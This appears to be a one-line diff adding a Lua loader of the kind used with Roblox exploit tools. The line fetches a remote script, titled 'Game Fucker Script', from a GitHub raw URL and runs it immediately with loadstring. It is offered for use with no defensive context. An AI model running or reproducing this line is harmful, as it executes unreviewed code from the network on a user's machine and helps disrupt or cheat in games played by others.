@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/K00lGhuy/funny-game-thingy/main/Game%20Fucker%20Script', true))()
